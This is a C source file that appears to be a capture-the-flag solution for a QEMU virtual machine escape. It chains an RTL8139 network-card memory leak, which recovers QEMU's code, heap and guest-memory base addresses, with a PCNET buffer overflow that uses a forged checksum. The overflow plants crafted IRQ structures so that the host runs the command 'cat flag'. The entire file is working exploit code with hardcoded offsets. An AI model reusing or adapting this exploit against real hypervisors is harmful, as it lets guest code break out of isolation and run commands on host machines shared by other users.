#include <sys/io.h>
#include <sys/mman.h>

#include <arpa/inet.h>
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <inttypes.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PAGE_SHIFT      12
#define PAGE_SIZE       (1 << PAGE_SHIFT)
#define PFN_PRESENT     (1ull << 63)
#define PFN_PFN         ((1ull << 55) - 1)
#define PHY_RAM         0x80000000

#define page_aligned __attribute__((aligned(PAGE_SIZE)))
#define offsetof(st, m) __builtin_offsetof(st, m)

#define LEAK_MAX 0x2000

#define CHUNK_SIZE_MASK ~7ull

#define NMEMB(a) sizeof(a)/sizeof(a[0])

typedef uint64_t hptr_t;
#define HNULL ((hptr_t)0x0)
#define PRIxHPTR PRIx64
typedef uint64_t hsize_t;

//RTL8139 Parameter
#define RTL8139_BUFFER_SIZE 1514
#define RTL8139_PORT 0xc000

#define CP_RX_OWN              (1<<31)
#define CP_RX_EOR              (1<<30)
#define CP_RX_BUFFER_SIZE_MASK ((1<<13) - 1)

#define CP_TX_OWN              (1<<31)
#define CP_TX_EOR              (1<<30)
#define CP_TX_FS               (1<<29)
#define CP_TX_LS               (1<<28)
#define CP_TX_LGSEN            (1<<27)
#define CP_TX_IPCS             (1<<18)
#define CP_TX_UDPCS            (1<<17)
#define CP_TX_TCPCS            (1<<16)
#define CP_TX_BUFFER_SIZE      (1<<16)
#define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)

enum RTL8139_registers {
	TxAddr0      = 0x20, /* Tx descriptors (also four 32bit). */
	ChipCmd      = 0x37,
	TxConfig     = 0x40,
	RxConfig     = 0x44,
	TxPoll       = 0xD9, /* tell chip to check Tx descriptors for work */
	CpCmd        = 0xE0, /* C+ Command register (C+ mode only) */
	RxRingAddrLO = 0xE4, /* 64-bit start addr of Rx ring */
	RxRingAddrHI = 0xE8, /* 64-bit start addr of Rx ring */
};

enum RTL8139_TxPollBits {
	CPlus = 0x40,
};

enum RT8139_ChipCmdBits {
	CmdReset   = 0x10,
	CmdRxEnb   = 0x08,
	CmdTxEnb   = 0x04,
	RxBufEmpty = 0x01,
};

enum RTL_8139_CplusCmdBits {
	CPlusRxVLAN   = 0x0040, /* enable receive VLAN detagging */
	CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */
	CPlusRxEnb    = 0x0002,
	CPlusTxEnb    = 0x0001,
};

enum RTL_8139_tx_config_bits {
	TxLoopBack = (1 << 18) | (1 << 17), /* enable loopback test mode */
	/*...*/
};

enum RTL_8139_rx_mode_bits {
	AcceptErr       = 0x20,
	AcceptRunt      = 0x10,
	AcceptBroadcast = 0x08,
	AcceptMulticast = 0x04,
	AcceptMyPhys    = 0x02,
	AcceptAllPhys   = 0x01,
	Wrap            = 0x80,
	MxDMA256        = 0x400,
	RbLen64         = 0x1800,
	RxFTh512        = 0xa000,
};

struct rtl8139_desc {
	uint32_t dw0;
	uint32_t dw1;
	uint32_t buf_lo;
	uint32_t buf_hi;
};

struct rtl8139_ring {
	struct rtl8139_desc *desc;
	void                *buffer;
};

/* malformed ip packet with corrupted header size */
static uint8_t rtl8139_packet [] = {
	0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x52, 0x54, 0x00, 0x12, 0x34,
	0x56, 0x08, 0x00, 0x45, 0x00, 0x00, 0x13, 0xde, 0xad, 0x40, 0x00,
	0x40, 0x06, 0xde, 0xad, 0xc0, 0x08, 0x01, 0x01, 0xc0, 0xa8, 0x01,
	0x02, 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe, 0xca, 0xfe,
	0xba, 0xbe, 0x50, 0x10, 0xde, 0xad, 0xde, 0xad, 0x00, 0x00
};

static int fd = -1;

struct IRQState {
	uint8_t  _nothing[44];
	hptr_t    handler;
	hptr_t    arg_1;
	int32_t   arg_2;
};

//PCNET Parameter
#define PCNET_BUFFER_SIZE 4096
#define PCNET_PORT        0xc100

#define DRX     0x0001
#define DTX     0x0002
#define LOOP    0x0004
#define DXMTFCS 0x0008
#define INTL    0x0040
#define DRCVPA  0x2000
#define DRCVBC  0x4000
#define PROM    0x8000

enum PCNET_registers {
	RDP = 0x10,
	RAP = 0x12,
	RST = 0x14,
};

#define CRC(crc, ch) (crc = (crc >> 8) ^ crctab[(crc ^ (ch)) & 0xff])

/* generated using the AUTODIN II polynomial
 *	x^32 + x^26 + x^23 + x^22 + x^16 +
 *	x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1
 */
static const uint32_t crctab[256] = {
	0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,
	0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,
	0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
	0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,
	0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,
	0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
	0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,
	0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,
	0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
	0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
	0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,
	0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
	0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,
	0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,
	0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
	0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,
	0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,
	0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
	0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,
	0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
	0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
	0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,
	0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,
	0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
	0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,
	0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,
	0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
	0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,
	0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,
	0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
	0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,
	0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,
	0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
	0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,
	0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,
	0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
	0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,
	0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,
	0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
	0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
	0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,
	0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
	0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,
	0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,
	0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
	0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,
	0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,
	0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
	0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,
	0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
	0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
	0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,
	0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,
	0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
	0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,
	0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,
	0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
	0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,
	0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,
	0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
	0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,
	0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,
	0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
	0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,
};

struct pcnet_config {
	uint16_t  mode;
	uint8_t   rlen;
	uint8_t   tlen;
	uint8_t   mac[6];
	uint16_t _reserved;
	uint8_t   ladr[8];
	uint32_t  rx_desc;
	uint32_t  tx_desc;
};

struct pcnet_desc {
	uint32_t  addr;
	int16_t   length;
	int8_t    status_1;
	int8_t    status_2;
	uint32_t  misc;
	uint32_t _reserved;
};

static uint8_t pcnet_packet[PCNET_BUFFER_SIZE] = {
	0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x52,
	0x54, 0x00, 0x12, 0x34, 0x56, 0x08, 0x00,
};

hptr_t phy_mem = 0;

/*
 ** taken from virtunoid.c
 ** adress translation utilities
 **/
uint32_t page_offset(uint32_t addr)
{
	return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
	uint64_t pme, gfn;
	size_t offset;
	offset = ((uintptr_t)addr >> 9) & ~7;
	lseek(fd, offset, SEEK_SET);
	read(fd, &pme, 8);
	if (!(pme & PFN_PRESENT))
		return -1;
	gfn = pme & PFN_PFN;
	return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
	uint64_t gfn = gva_to_gfn(addr);
	assert(gfn != -1);
	return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

hptr_t gva_to_hva(void *addr)
{
		return gva_to_gpa(addr) + phy_mem;
}

int cmp_page_offset(const void *a, const void *b)
{
	return page_offset(*(hptr_t *)a) - page_offset(*(hptr_t *)b);
}

/* dump packet content in xxd style */
void xxd(void *ptr, size_t size)
{
	size_t i;
	for (i = 0; i < size; i++) {
		if (i % 16 == 0) printf("\n0x%016x: ", ptr+i);
		printf("%02x", *(uint8_t *)(ptr+i));
		if (i % 16 != 0 && i % 2 == 1) printf(" ");
	}
	printf("\n");
}

uint64_t searchTextBase(void *ptr, size_t size)
{
	size_t i;
	int j, k;
	uint64_t value;
	bool flag = 0;
	uint64_t magic_value[6] = { 0x943460, //io_mem_watch
		0x943220, //io_mem_notdirty
		0x943120, //io_mem_rom
		0x399982, //property_get_str
		0xfb737, //memory_region_destructor_none
		0xb02e1, //address_space_dispatch_free
	};
       	uint64_t ans = 0;
	for (i = 0; i < size-8; i += 8)
	{
		value = 0;
		for ( j = 0; j < 8; j++)
		{
			uint64_t t = *(uint8_t*)(ptr + i + j);
			value += (t << (j*8));
		}
		if((value & 0xfffff00000000000) == 0x500000000000) 
		{
			for( j = 0; j< sizeof(magic_value); j++)
			{
				if( ((value-magic_value[j]) & 0xfff) == 0)
				{
					ans = value - magic_value[j];
					flag = 1;
					break;
				}
			}
			if(flag)
			{
				break;
			}
		}
	}
	return ans;
}

uint64_t searchPhyBase(void *ptr, size_t size)
{
	size_t i;
	int j;
	uint64_t value, ans = 0;
	bool flag = 0;
	for (i = 0; i < size-8; i += 8)
	{
		value = 0;
		for ( j = 0; j < 8; j++)
		{
			uint64_t t = *(uint8_t*)(ptr + i + j);
			value += (t << (j*8));
		}
		if((value & 0xfffff00000000000) == 0x700000000000)
		{
			flag = 1;
			ans = value & 0xffffffffff000000;
			ans -= 0x80000000;
			break;
		}
		
	}
	if(flag){
		return ans;
	}
	else
		return 0;
}

uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
{
	size_t i;
	int j;
	uint64_t value, ans = 0;
	bool flag = 0;
	uint64_t target_offset[4] = {0xb1f80, 0x11a3dc8, 0x14a31c0, 0x14fb60};
	for (i = 0; i < size-8; i += 8)
	{
		value = 0;
		for ( j = 0; j < 8; j++)
		{
			uint64_t t = *(uint8_t*)(ptr + i + j);
			value += (t << (j*8));
		}
		if((value & 0xffff00000000) == (textBase & 0xffff00000000) && value!=0)
		{	
			if( (value - textBase) > 0xde2000)
			{				
			    for(j = 0; j < 4; j++)
			    {
				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
					    ans = value -target_offset[j];
					    flag = 1;
					    break;
				    }
			    }
			}
		}
		if(flag)
			break;
		
	}
	if(flag){
		return ans;
	}
	else
		return 0;
}
/* RTL8139 primitives */
void rtl8139_card_config()
{
	outl(TxLoopBack, RTL8139_PORT + TxConfig);
	outl(AcceptMyPhys, RTL8139_PORT + RxConfig);
	outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);
	outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);
}

void rtl8139_desc_config_tx(struct rtl8139_desc *desc, void *buffer)
{
	uint32_t addr;

	memset(desc, 0, sizeof(struct rtl8139_desc));
	desc->dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN |
	             CP_TX_IPCS | CP_TX_TCPCS;
	desc->dw0 += RTL8139_BUFFER_SIZE;

	addr =  (uint32_t)gva_to_gpa(buffer);
	desc->buf_lo = addr;

	addr = (uint32_t)gva_to_gpa(desc);
	outl(addr, RTL8139_PORT + TxAddr0);
	outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);
}

void rtl8139_desc_config_rx(struct rtl8139_ring *ring,
                            struct rtl8139_desc *desc, int nb)
{
	uint32_t addr;
	size_t i;
	for (i = 0; i < nb; i++) {
		ring[i].desc = &desc[i];
		memset(ring[i].desc, 0, sizeof(struct rtl8139_desc));

		ring[i].buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);
		memset(ring[i].buffer, 0, RTL8139_BUFFER_SIZE);

		addr = (uint32_t)gva_to_gpa(ring[i].buffer);

		ring[i].desc->dw0 |= CP_RX_OWN;
		if (i == nb - 1)
			ring[i].desc->dw0 |= CP_RX_EOR;
		ring[i].desc->dw0 &= ~CP_RX_BUFFER_SIZE_MASK;
		ring[i].desc->dw0 |= USHRT_MAX;
		ring[i].desc->buf_lo = addr;
	}

	addr = (uint32_t)gva_to_gpa(desc);
	outl(addr, RTL8139_PORT + RxRingAddrLO);
	outl(0x0, RTL8139_PORT + RxRingAddrHI);
}

void rtl8139_packet_send(void *buffer, void *packet, size_t len)
{
	if (len <= RTL8139_BUFFER_SIZE) {
		memcpy(buffer, packet, len);
		outb(CPlus, RTL8139_PORT + TxPoll);
	}
}

/* PCNET primitives */
void pcnet_packet_patch_crc(uint8_t *packet, uint32_t current,
                            uint32_t target)
{
	size_t i = 0, j;
	uint8_t *ptr;
	uint32_t workspace[2] = { current, target };
	for (i = 0; i < 2; i++)
		workspace[i] &= (uint32_t)~0;
	ptr = (uint8_t *)(workspace + 1);
	for (i = 0; i < 4; i++) {
		j = 0;
		while(crctab[j] >> 24 != *(ptr + 3 - i)) j++;
		*((uint32_t *)(ptr - i)) ^= crctab[j];
		*(ptr - i - 1) ^= j;
	}
	strncpy(packet, ptr - 4, 4);
}

uint64_t pcnet_card_config(struct pcnet_config *config,
                           struct pcnet_desc *rx_desc,
                           struct pcnet_desc *tx_desc)
{
	memset(config, 0, sizeof(struct pcnet_config));

	config->mode = LOOP | PROM;
	strcpy(config->mac, "\xaa\xbb\xcc\xdd\xee\xff");
	config->rlen = 0x0;
	config->tlen = 0x0;
	config->rx_desc = (uint32_t)gva_to_gpa(rx_desc);
	config->tx_desc = (uint32_t)gva_to_gpa(tx_desc);
	return gva_to_gpa(config);
}

void pcnet_desc_config(struct pcnet_desc *desc, void *buffer, int is_rx)
{
	uint16_t bcnt = -PCNET_BUFFER_SIZE;
	bcnt &= 0xfff;
	bcnt |= 0xf000;

	memset(desc, 0, sizeof(struct pcnet_desc));
	memset(buffer, 0, PCNET_BUFFER_SIZE);
	desc->addr = (uint32_t)gva_to_gpa(buffer);
	desc->length = bcnt;
	if (is_rx) {
		/* receive buffers owned by the card */
		desc->status_2 = 0x80;
	}
}

void pcnet_packet_send(struct pcnet_desc *desc, void *buffer,
                       void *packet, size_t len)
{
	if (len <= PCNET_BUFFER_SIZE) {
		memcpy(buffer, packet, len);

		/* set STP ENP ADDFCS bits */
		desc->status_2 |= 0x23;

		len = (-len);
		len &= 0xfff;
		len |= 0xf000;
		desc->length = len;

		/* flip ownership to card */
		desc->status_2 |= 0x80;

		/* signal packet */
		outw(0, PCNET_PORT + RAP);
		outw(0x8, PCNET_PORT + RDP);
	}
}

int createCraftIRQ(uint64_t *ptr, uint64_t addr, uint64_t fun_ptr, uint64_t RDI, uint64_t RSI)
{
	int i = (addr - 0x12890f0)/8;
	*(ptr + 250 + i + 6) = fun_ptr;
	*(ptr + 250 + i + 7) = RDI;
	*(ptr + 250 + i + 8) = RSI;	
	return 0;
}

int createCraftIRQArray(uint64_t *ptr, uint64_t addr, uint64_t obj1Addr, uint64_t obj2Addr)
{
	int i = (addr - 0x12890f0)/8;
	*(ptr + 250 + i) = obj1Addr;
	*(ptr + 250 + i + 1) = obj2Addr;
	return 0;
}

int main()
{
	struct rtl8139_ring *rtl8139_rx_ring;
	struct rtl8139_desc *rtl8139_rx_desc, rtl8139_tx_desc;
	void *rtl8139_tx_buffer;
	static const int rtl8139_rx_nb = 44;

	struct pcnet_config pcnet_config;
	uint32_t pcnet_config_mem;
	struct pcnet_desc pcnet_tx_desc page_aligned;
	struct pcnet_desc pcnet_rx_desc page_aligned;
	void *pcnet_rx_buffer, *pcnet_tx_buffer;

	void *addr;
	uint64_t *packet_ptr, targetValue = 0;
	hptr_t text, mprotect_addr, qemu_set_irq_addr;

	uint32_t fcs = ~0;
	uint8_t *ptr;
	uint16_t lo, hi;

	void *leak[LEAK_MAX];
	size_t nb_leak = 0;
	int score;

	fd = open("/proc/self/pagemap", O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

	rtl8139_rx_ring = calloc(rtl8139_rx_nb, sizeof(struct rtl8139_ring));
	rtl8139_rx_desc = aligned_alloc(PAGE_SIZE, sizeof(struct rtl8139_desc) * rtl8139_rx_nb);
	rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);

	iopl(3);

	rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc,
                           rtl8139_rx_nb);
	rtl8139_desc_config_tx(&rtl8139_tx_desc, rtl8139_tx_buffer);

	rtl8139_card_config();
	rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet,
                        sizeof(rtl8139_packet));

	sleep(2);

	/* dump packet content in xxd style */
	size_t i;
	uint64_t textBaseAddr = 0;
	uint64_t phyBaseAddr = 0;
	uint64_t heapBaseAddr = 0;
	//for (i = 0; i < rtl8139_rx_nb; i++)
	//	xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
	for (i = 0; i < rtl8139_rx_nb; i++)
	{
		textBaseAddr = searchTextBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
		if(textBaseAddr != 0)
			break;
	}

	if(textBaseAddr != 0)
	{
		printf("[+] Base address of QEMU text: 0x%llx\n", textBaseAddr);
	}
	else
	{
		printf("[-] Fail to get base address of qemu text\n");
		exit(0);
	}

	for (i = 0; i < rtl8139_rx_nb; i++)
	{
		phyBaseAddr = searchPhyBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
		if(phyBaseAddr != 0)
			break;
	}

	if(phyBaseAddr != 0)
	{	
		printf("[+] Physical base of virtual memory in guest machine: 0x%llx\n", phyBaseAddr);
	}
	else
	{
		printf("[-] Fail to get base address of PHY_MEM of virtual memory\n");
		exit(0);
	}

	for (i = 0; i < rtl8139_rx_nb; i++)
	{
		heapBaseAddr = searchHeapBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE, textBaseAddr);
		if(heapBaseAddr != 0)
			break;
	}

	if(heapBaseAddr != 0)
	{	
		printf("[+] Base address of heap address: 0x%llx\n", heapBaseAddr);
	}
	else
	{
		printf("[-] Fail to get base address of heap address\n");
		exit(0);
	}

	printf("[+] Start to pwn\n");
	char cmd[9] = "cat flag";
	packet_ptr = pcnet_packet;
	for(int j=0x10; j<0x1f8; j += 2){
		*(packet_ptr + j) = 0x414141414141 + (j-0x10)/2; //textBaseAddr + 0xa8a00;
		*(packet_ptr + j + 1) = heapBaseAddr + 0x12889b0;
		//*(packet_ptr + j + 2) = 0x68732f2f6e69622f;
			//0x67616c6620746163;//0x736c; //"ls"
		//*(packet_ptr + j + 3) = 0;
	}

	//crafted IRQ 1
	createCraftIRQ(packet_ptr, 0x12890f0, textBaseAddr + 0x285b85,
			heapBaseAddr + 0x1289140, 11);


	//craft irq[0] and irq[1]
	createCraftIRQArray(packet_ptr, 0x1289140, heapBaseAddr + 0x1289160, heapBaseAddr + 0x12891f0);
	
	//crafted IRQ 2
	createCraftIRQ(packet_ptr, 0x1289160, textBaseAddr + 0x28590a,
			heapBaseAddr + 0x12891a0, 0xb);

	//crafted IRQ 3
	createCraftIRQ(packet_ptr, 0x12891a0, textBaseAddr + 0xa7bd0,
			phyBaseAddr, 0x80000000);

	//crafted IRQ 4
	createCraftIRQ(packet_ptr, 0x12891f0, textBaseAddr + 0x285b85, heapBaseAddr + 0x1289240, 0x1010);

	//craft irq[0] and irq[1]
	createCraftIRQArray(packet_ptr, 0x1289240, heapBaseAddr + 0x1289250, heapBaseAddr + 0x12892a0);

	//crafted IRQ 5 
	createCraftIRQ(packet_ptr, 0x1289250, textBaseAddr + 0xa8a00,
			phyBaseAddr + gva_to_gpa(cmd), 0x4141414141);

	//crafte IRQ 6
	createCraftIRQ(packet_ptr, 0x12892a0, 0x202020202020, 0x3030, 0x4040);

	addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE);
	pcnet_rx_buffer = (uint64_t *)addr;
	
	addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE);
	pcnet_tx_buffer = (uint64_t *)addr;
	
	pcnet_desc_config(&pcnet_rx_desc, pcnet_rx_buffer, 1);
	pcnet_desc_config(&pcnet_tx_desc, pcnet_tx_buffer, 0);

	pcnet_config_mem = (uint32_t)pcnet_card_config(&pcnet_config, 
			&pcnet_rx_desc, &pcnet_tx_desc);
	
	lo = (uint16_t)pcnet_config_mem;
	hi = pcnet_config_mem >> 16;
	
	/* compute required crc */
	ptr = pcnet_packet;
	while (ptr != &pcnet_packet[PCNET_BUFFER_SIZE - 4])
		CRC(fcs, *ptr++);
	
	targetValue = (heapBaseAddr + 0x1289120 - 0x30) & 0xffffffff;
	//targetValue = 0xdeadbeef;
	
	pcnet_packet_patch_crc(ptr, fcs, htonl((uint32_t)targetValue));
	
	/* soft reset */
	inl(PCNET_PORT + 0x18);
	inw(PCNET_PORT + RST);

	/* set swstyle */
	outw(58, PCNET_PORT + RAP);
	outw(0x0102, PCNET_PORT + RDP);

	/* card config */
	outw(1, PCNET_PORT + RAP);
	outw(lo, PCNET_PORT + RDP);
	outw(2, PCNET_PORT + RAP);
	outw(hi, PCNET_PORT + RDP);
	
	/* init and start */
	outw(0, PCNET_PORT + RAP);
	outw(0x3, PCNET_PORT + RDP);
	
	sleep(2);
	pcnet_packet_send(&pcnet_tx_desc, pcnet_tx_buffer, pcnet_packet,
			PCNET_BUFFER_SIZE);

	/* stop card */
	outw(0, PCNET_PORT + RAP);
	outw(0x4, PCNET_PORT + RDP);
}
